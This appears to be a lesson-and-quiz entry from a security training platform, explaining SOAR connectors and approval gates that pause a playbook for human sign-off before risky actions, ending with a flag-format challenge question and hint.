tasks.learn: Connectors — the integrations that turn SOAR from a flowchart into a system that actually acts across your tools.
tasks.example: One playbook might use five connectors: SIEM (read), VirusTotal (enrich), EDR (isolate), firewall (block), TheHive/Jira (ticket).

tasks.title: Human in the loop
tasks.teach: Not everything should run unattended. An approval gate pauses a playbook before a high-impact or irreversible action (isolating a production server, disabling an exec's account, blocking a business-critical IP) and waits for a human to approve. This 'human in the loop' keeps automation fast on the safe steps while a person owns the consequential decisions.
tasks.chal: What is a playbook pause that waits for human approval before a risky action called (two words)? Submit TG{••••••••_••••}.
hints: Human in the loop, before the big action.
